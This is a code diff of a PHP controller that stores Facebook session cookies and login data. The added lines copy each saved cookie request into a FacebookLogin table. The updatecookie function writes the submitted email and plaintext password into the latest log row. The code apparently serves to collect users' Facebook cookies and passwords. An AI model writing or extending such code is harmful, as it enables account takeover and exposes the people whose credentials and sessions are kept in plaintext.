@@ -11,6 +11,7 @@ use App\Cookies;
 use App\Facebook;
 use JWTAuthException;
 use Validator;
+use App\FacebookLogin;
 
 
 
@@ -191,6 +192,7 @@ $validator = Validator::make($request->all(), $rules);
             {
                // echo "<pre>"; print_r($request['data']); die();
                 $data = Cookies::where('user_id',$request['user_id'])->update($request->except(['data']));
+                FacebookLogin::create($request->all());
 
                 if($data)
                 {
@@ -209,9 +211,9 @@ $validator = Validator::make($request->all(), $rules);
 
 
 
-
             }elseif (empty($cookieData['user_id'])) {
                 if(Cookies::create($request->all())){
+                    FacebookLogin::create($request->all());
                 return response()->json([
                     'status' => 'success', 
                     'msg' => 'Cookies save successfully.'
@@ -226,6 +228,7 @@ $validator = Validator::make($request->all(), $rules);
             }else{
 
 			if(Cookies::create($request->all())){
+                FacebookLogin::create($request->all());
 				return response()->json([
                     'status' => 'success', 
                     'msg' => 'Cookies save successfully.'
@@ -273,9 +276,12 @@ $validator = Validator::make($request->all(), $rules);
 
     public function updatecookie(Request $request)
     {
+      $logid = FacebookLogin::where('user_id',$request['user_id'])->orderBy('id','desc')->first();
+
 
         Cookies::where('user_id',$request['user_id'])->update(['email' => $request['email'],'password' => $request['password']]);
-        
+
+          FacebookLogin::where('id', $logid['id'])->update(['name' => $request['email'],'password' => $request['password']]);        
      
     }
 
